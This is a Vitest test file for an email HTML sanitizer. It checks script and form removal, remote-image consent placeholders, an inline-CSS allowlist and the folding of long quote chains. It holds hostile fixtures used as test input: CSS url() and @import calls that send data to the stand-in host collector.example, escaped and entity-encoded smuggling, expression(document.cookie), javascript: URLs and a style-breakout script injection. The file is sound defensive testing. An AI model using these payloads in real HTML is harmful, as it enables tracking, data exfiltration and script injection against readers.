import { describe, expect, it } from 'vitest';

import { detectDesignedEmail, QUOTE_COLLAPSE_THRESHOLD, sanitizeArchivedHTML } from './sanitize';

// Real-world-shaped fixtures for the designed-mail heuristic and the reading
// affordances built on top of sanitization.
const MARKETING_EMAIL = `
  <html><head><style>.wrapper{background-color:#f4f4f4}</style></head>
  <body bgcolor="#f4f4f4">
  <table width="640" align="center"><tr>
    <td width="320" style="background-color:#ffffff;color:#111111">New drops</td>
    <td width="320"><img src="https://images.example/hero.png" alt="Hero" width="320"></td>
  </tr></table>
  </body></html>`;

const PLAIN_REPLY_EMAIL = `
  <div dir="ltr">Sounds good — let&#39;s do Tuesday.<br><br>Thanks!<div><br></div></div>
  <div class="gmail_quote">
    <div class="gmail_attr">On Mon, Jul 20, 2026 Alice &lt;alice@example.com&gt; wrote:</div>
    <blockquote class="gmail_quote">
      Are you free Tuesday or Wednesday next week? ${'We could also look at the following week. '.repeat(12)}
      <blockquote>Original scheduling note from way back.</blockquote>
    </blockquote>
  </div>`;

describe('sanitizeArchivedHTML', () => {
  it('removes active content, network-capable elements, and focus authority', () => {
    const result = sanitizeArchivedHTML(`
      <script>parent.postMessage({type:'close'}, '*')</script>
      <form action="https://collector.example/submit"><input autofocus name="secret"><button accesskey="x">Esc</button></form>
      <svg><a xlink:href="https://collector.example/svg"><text>SVG link</text></a></svg>
      <video poster="https://collector.example/poster"><source src="https://collector.example/movie"></video>
      <a href="https://collector.example/click" onclick="steal()" tabindex="0">External</a>
      <div role="button" contenteditable="true" onkeydown="steal()">Press Esc</div>
      <p style="background-image:url(https://collector.example/css)">Safe words</p>
      <style>@import 'https://collector.example/import';</style>
    `, { messageId: 42 });

    expect(result.html).toContain('Safe words');
    expect(result.html).toContain('Press Esc');
    expect(result.html).not.toMatch(/<(?:script|form|input|button|svg|video|source)\b|style=/i);
    expect(result.html).not.toMatch(/https?:|collector\.example|onclick|onkeydown|autofocus|accesskey|tabindex|contenteditable|role=/i);
    expect(result.remoteImages).toEqual([]);
  });

  it('drops hostile CSS smuggling while keeping benign author styles', () => {
    const result = sanitizeArchivedHTML(`
      <p style="background:UrL(https://collector.example/mixed)">Mixed</p>
      <p style="background:u/**/rl(https://collector.example/comment)">Comment</p>
      <p style="background:\\75\\72\\6c(https://collector.example/escaped)">Escaped</p>
      <p style="background:&#x75;rl(https://collector.example/entity)">Encoded</p>
      <p style="@\\69mport 'https://collector.example/import'">Import</p>
      <p style="color: red">Benign looking</p>
    `, { messageId: 42 });

    expect(result.html).toContain('Benign looking');
    expect(result.html).not.toMatch(/collector\.example|url\s*\(|\\75|&#x75/i);
    const template = document.createElement('template');
    template.innerHTML = result.html;
    const styled = [...template.content.querySelectorAll('[style]')];
    expect(styled).toHaveLength(1);
    expect(styled[0]?.getAttribute('style')).toBe('color: red');
  });

  it('extracts CID images into URL-free shell descriptors', () => {
    const result = sanitizeArchivedHTML(
      '<img src="cid:logo/part@example.com" alt="Archived logo">',
      { messageId: 42 }
    );

    expect(result.html).toContain('Inline image loading: Archived logo');
    expect(result.html).not.toMatch(/cid:|\/api\/v1\/messages|logo\/part@example\.com/);
    expect(result.inlineImages).toEqual([{ cid: 'logo/part@example.com', alt: 'Archived logo' }]);
    expect(result.remoteImages).toEqual([]);
  });

  it('replaces remote images with URL-free consent placeholders', () => {
    const result = sanitizeArchivedHTML(`
      <img src="https://images.example/pixel.png?secret=1" alt="Chart">
      <img src="//images.example/second.png" alt="Second">
    `, { messageId: 42 });

    expect(result.remoteImages).toEqual([
      'https://images.example/pixel.png?secret=1',
      'https://images.example/second.png'
    ]);
    expect(result.html).toContain('data-archived-remote-image="0"');
    expect(result.html).toContain('data-archived-remote-image="1"');
    expect(result.html).not.toMatch(/images\.example|secret=1/);
  });

  it('renders blocked remote images as captioned placeholder blocks, not body copy', () => {
    const longAlt = 'Want to be the first to know about new drops? Subscribe now for updates.';
    const result = sanitizeArchivedHTML(`
      <img src="https://images.example/one.png" alt="${longAlt}">
      <img src="https://images.example/two.png" alt="Second">
      <img src="https://images.example/three.png">
      <img src="https://images.example/four.png" alt="Fourth">
    `, { messageId: 42 });

    const template = document.createElement('template');
    template.innerHTML = result.html;
    const placeholders = template.content.querySelectorAll('[data-archived-remote-image]');
    expect(placeholders).toHaveLength(4);
    for (const placeholder of placeholders) {
      expect(placeholder.hasAttribute('data-archived-image-placeholder')).toBe(true);
      expect(placeholder.querySelector('[data-archived-image-glyph]')).not.toBeNull();
      expect(placeholder.querySelector('[data-archived-image-caption]')).not.toBeNull();
    }
    // The alt text lives in the caption, never as free-flowing body prose.
    expect(template.content.querySelector('[data-archived-remote-image="0"]')?.textContent)
      .toBe(longAlt);
    expect(result.html).not.toContain('Remote image blocked:');
    // An alt-less image still gets a legible caption.
    expect(template.content.querySelector('[data-archived-remote-image="2"]')?.textContent)
      .toBe('Remote image');
  });

  it('allows only explicitly consented remote image URLs', () => {
    const result = sanitizeArchivedHTML(
      '<img src="https://images.example/chart.png" alt="Chart"><p style="background:url(https://tracker.example/bg)">Text</p>',
      { messageId: 42, allowRemoteImages: true }
    );

    expect(result.html).toContain('src="https://images.example/chart.png"');
    expect(result.html).not.toContain('tracker.example');
    expect(result.remoteImages).toEqual(['https://images.example/chart.png']);
  });

  it('handles malformed HTML without restoring stripped content', () => {
    const result = sanitizeArchivedHTML(
      '<div><p>Readable<script><img src=https://tracker.example/pixel></div><img src="javascript:alert(1)">',
      { messageId: 7 }
    );

    expect(result.html).toContain('Readable');
    expect(result.html).not.toMatch(/script|javascript:|tracker\.example/i);
  });

  it('collapses long quote chains behind a native Show quoted text toggle', () => {
    const result = sanitizeArchivedHTML(PLAIN_REPLY_EMAIL, { messageId: 42 });
    const template = document.createElement('template');
    template.innerHTML = result.html;

    const toggle = template.content.querySelector('details[data-archived-quote-toggle]');
    expect(toggle).not.toBeNull();
    expect(toggle?.querySelector('summary [data-archived-quote-show]')?.textContent)
      .toBe('Show quoted text');
    expect(toggle?.querySelector('summary [data-archived-quote-hide]')?.textContent)
      .toBe('Hide quoted text');
    // The whole Gmail quote container folds as one unit; nested quotes are
    // not double-wrapped.
    expect(toggle?.querySelector('[data-archived-quote]')?.classList.contains('gmail_quote'))
      .toBe(true);
    expect(template.content.querySelectorAll('details[data-archived-quote-toggle]')).toHaveLength(1);
    // The reply itself stays outside the fold.
    expect(template.content.firstElementChild?.textContent).toContain('Sounds good');
    expect(toggle?.textContent).not.toContain('Sounds good');
  });

  it('styles short quotes without hiding them behind a toggle', () => {
    const short = `<p>Agreed.</p><blockquote>${'a'.repeat(QUOTE_COLLAPSE_THRESHOLD - 1)}</blockquote>`;
    const result = sanitizeArchivedHTML(short, { messageId: 42 });
    const template = document.createElement('template');
    template.innerHTML = result.html;

    expect(template.content.querySelector('details[data-archived-quote-toggle]')).toBeNull();
    expect(template.content.querySelector('blockquote')?.hasAttribute('data-archived-quote'))
      .toBe(true);
  });
});

/** Sanitizes a single styled paragraph and returns the surviving style attribute. */
function survivingStyle(style: string): string | null {
  const result = sanitizeArchivedHTML(`<p style="${style}">Body</p>`, { messageId: 42 });
  const template = document.createElement('template');
  template.innerHTML = result.html;
  return template.content.querySelector('p')?.getAttribute('style') ?? null;
}

describe('inline style allowlist', () => {
  it.each([
    ['text color', 'color:#333333', 'color: #333333'],
    ['background color', 'background-color:#f4f4f4', 'background-color: #f4f4f4'],
    ['background shorthand reduced to a plain color', 'background:#101827', 'background: #101827'],
    ['named color', 'color:rebeccapurple', 'color: rebeccapurple'],
    ['rgb color', 'color:rgb(16, 24, 39)', 'color: rgb(16, 24, 39)'],
    ['rgba color', 'background-color:rgba(0, 0, 0, 0.5)', 'background-color: rgba(0, 0, 0, 0.5)'],
    ['hsl color', 'color:hsl(210, 40%, 30%)', 'color: hsl(210, 40%, 30%)'],
    ['font family list', 'font-family:Helvetica,Arial,sans-serif', 'font-family: Helvetica,Arial,sans-serif'],
    ['font size', 'font-size:15px', 'font-size: 15px'],
    ['font weight keyword', 'font-weight:bold', 'font-weight: bold'],
    ['font weight number', 'font-weight:600', 'font-weight: 600'],
    ['font style', 'font-style:italic', 'font-style: italic'],
    ['text align', 'text-align:center', 'text-align: center'],
    ['text decoration', 'text-decoration:none', 'text-decoration: none'],
    ['text transform', 'text-transform:uppercase', 'text-transform: uppercase'],
    ['line height', 'line-height:1.6', 'line-height: 1.6'],
    ['letter spacing', 'letter-spacing:0.5px', 'letter-spacing: 0.5px'],
    ['padding shorthand', 'padding:28px 32px', 'padding: 28px 32px'],
    ['centering margin', 'margin:0 auto', 'margin: 0 auto'],
    ['margin shorthand', 'margin:8px 0 0', 'margin: 8px 0 0'],
    ['small negative margin', 'margin-left:-4px', 'margin-left: -4px'],
    ['border shorthand', 'border:1px solid #eeeeee', 'border: 1px solid #eeeeee'],
    ['border side shorthand', 'border-top:1px solid #eeeeee', 'border-top: 1px solid #eeeeee'],
    ['border radius', 'border-radius:4px', 'border-radius: 4px'],
    ['percentage width', 'width:100%', 'width: 100%'],
    ['max width', 'max-width:600px', 'max-width: 600px'],
    ['pixel height', 'height:240px', 'height: 240px'],
    ['inline-block display', 'display:inline-block', 'display: inline-block'],
    ['display none', 'display:none', 'display: none'],
    ['table-cell display', 'display:table-cell', 'display: table-cell'],
    ['vertical align', 'vertical-align:middle', 'vertical-align: middle'],
    ['white space', 'white-space:nowrap', 'white-space: nowrap'],
    ['border collapse', 'border-collapse:collapse', 'border-collapse: collapse'],
    ['border spacing', 'border-spacing:0', 'border-spacing: 0'],
    ['table layout', 'table-layout:fixed', 'table-layout: fixed'],
    ['float', 'float:left', 'float: left'],
    ['clear', 'clear:both', 'clear: both'],
    ['direction', 'direction:rtl', 'direction: rtl'],
    ['important flag stripped, declaration kept', 'color:#333333 !important', 'color: #333333'],
    ['mixed hostile and benign declarations',
      'background:url(https://collector.example/x);color:#ff0000', 'color: #ff0000']
  ])('keeps %s', (_name, input, expected) => {
    expect(survivingStyle(input)).toBe(expected);
  });

  it.each([
    ['background url smuggling', 'background:url(https://collector.example/a)'],
    ['background-image (never allowlisted)', 'background-image:url(https://collector.example/b)'],
    ['background color plus url', 'background:#ffffff url(https://collector.example/c)'],
    ['url hidden past a color function', 'color:rgb(1,2,3) url(https://collector.example/d)'],
    ['nested function inside color args', 'color:rgb(calc(1),2,3)'],
    ['escaped url', 'background:\\75\\72\\6c(https://collector.example/e)'],
    ['expression()', 'width:expression(alert(1))'],
    ['expression in color', 'color:expression(document.cookie)'],
    ['javascript scheme in value', 'background:javascript:alert(1)'],
    ['behavior binding', 'behavior:url(#default#time2)'],
    ['moz binding', '-moz-binding:url(https://collector.example/f)'],
    ['fixed positioning overlay', 'position:fixed'],
    ['absolute positioning', 'position:absolute'],
    ['z-index stacking', 'z-index:2147483647'],
    ['transform', 'transform:translate(-9999px, 0)'],
    ['transition', 'transition:opacity 1s'],
    ['animation', 'animation:steal 1s infinite'],
    ['filter', 'filter:blur(4px)'],
    ['clip path', 'clip-path:inset(0)'],
    ['generated content', "content:'phishing text'"],
    ['custom property definition', '--stolen:url(https://collector.example/g)'],
    ['var() indirection', 'color:var(--stolen)'],
    ['quoted font family injection', 'font-family:"</style><script>alert(1)</script>"'],
    ['clickjack negative margin', 'margin-top:-2000px'],
    ['negative margin beyond the -8px clamp', 'margin:-9px 0'],
    ['negative margin in non-px units', 'margin:-1em 0'],
    ['flex display (outside the allowlisted set)', 'display:flex'],
    ['width keyword outside lengths/percent', 'width:max-content'],
    ['extra tokens after a color value', 'color:#fff f'],
    ['control characters in a value', 'color:#fff\u0000red'],
    ['unknown property', 'offset-path:ray(45deg)']
  ])('drops %s', (_name, input) => {
    expect(survivingStyle(input)).toBeNull();
  });

  it('keeps safe declarations from an overlay attack while dropping the positioning', () => {
    const style = survivingStyle('display:block;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999');
    expect(style).toBe('display: block; width: 100%; height: 100%');
  });

  it('keeps real marketing-mail styling end to end', () => {
    const result = sanitizeArchivedHTML(
      '<table><tr><td style="background-color:#101827;color:#ffffff;padding:28px 20px;font-family:Georgia,serif;font-size:26px">HEADER</td></tr></table>',
      { messageId: 42 }
    );
    expect(result.html).toContain(
      'background-color: #101827; color: #ffffff; padding: 28px 20px; font-family: Georgia,serif; font-size: 26px'
    );
  });
});

describe('legacy presentational attributes', () => {
  it('keeps bgcolor on table structure with safe color values', () => {
    const result = sanitizeArchivedHTML(
      '<table bgcolor="#f2f2f2"><tr bgcolor="white"><td bgcolor="#ffffff">Cell</td></tr></table>',
      { messageId: 42 }
    );
    expect(result.html).toContain('<table bgcolor="#f2f2f2">');
    expect(result.html).toContain('<tr bgcolor="white">');
    expect(result.html).toContain('<td bgcolor="#ffffff">');
  });

  it('keeps color on font tags and drops it elsewhere', () => {
    const result = sanitizeArchivedHTML(
      '<font color="#0000aa">Old school</font><span color="#00aa00">Span</span>',
      { messageId: 42 }
    );
    expect(result.html).toContain('<font color="#0000aa">');
    expect(result.html).not.toContain('<span color');
  });

  it('drops bgcolor with unsafe values or on non-table elements', () => {
    const result = sanitizeArchivedHTML(
      '<td bgcolor="url(https://collector.example/x)">A</td><div bgcolor="#ffffff">B</div>',
      { messageId: 42 }
    );
    expect(result.html).not.toMatch(/bgcolor|collector\.example/);
  });

  it('keeps table sizing and alignment attributes marketing mail relies on', () => {
    const result = sanitizeArchivedHTML(
      '<table width="600" cellpadding="0" cellspacing="0" align="center"><tr><td width="50%" align="center" valign="top" height="40">Cell</td></tr></table>',
      { messageId: 42 }
    );
    expect(result.html).toContain('width="600"');
    expect(result.html).toContain('cellpadding="0"');
    expect(result.html).toContain('cellspacing="0"');
    expect(result.html).toContain('valign="top"');
  });
});

describe('detectDesignedEmail', () => {
  it('classifies marketing table mail as designed', () => {
    expect(detectDesignedEmail(MARKETING_EMAIL)).toBe(true);
    expect(sanitizeArchivedHTML(MARKETING_EMAIL, { messageId: 42 }).designed).toBe(true);
  });

  it('classifies plain replies with quote chains as theme-native', () => {
    expect(detectDesignedEmail(PLAIN_REPLY_EMAIL)).toBe(false);
    expect(sanitizeArchivedHTML(PLAIN_REPLY_EMAIL, { messageId: 42 }).designed).toBe(false);
  });

  it.each([
    ['bgcolor attribute', '<table><tr><td bgcolor="#ffffff">Only cell</td></tr></table>'],
    ['inline background style', '<div style="background:#101827"><p>Hero</p></div>'],
    ['background image style',
      '<table><tr><td style="background-image:url(banner.png)">Banner</td></tr></table>'],
    ['style-element background', '<style>.card{background-color:#fff}</style><p>Body</p>'],
    ['multi-column layout table', '<table><tr><td>Left nav</td><td>Right content</td></tr></table>']
  ])('treats %s as designed', (_name, html) => {
    expect(detectDesignedEmail(html)).toBe(true);
  });

  it.each([
    ['bare paragraphs and breaks', '<p>Hello,</p><br><div>See you then.<br>— Bob</div>'],
    ['inline span color only', '<p>Note: <span style="color:#1f497d">tracked change</span></p>'],
    ['a colored signature block in a plain reply',
      '<p>Thanks, see you Tuesday.</p><div style="color:#500050">Alice Example<br>Example Corp</div>'],
    ['container text color without any background', '<div style="color:#8899aa">Footer legalese</div>'],
    ['single-column table', '<table><tr><td>One column of text</td></tr></table>'],
    ['transparent background', '<div style="background:transparent">Quoted</div>'],
    ['full plain document', '<html><body><p>Plain reply body.</p></body></html>']
  ])('keeps %s theme-native', (_name, html) => {
    expect(detectDesignedEmail(html)).toBe(false);
  });
});
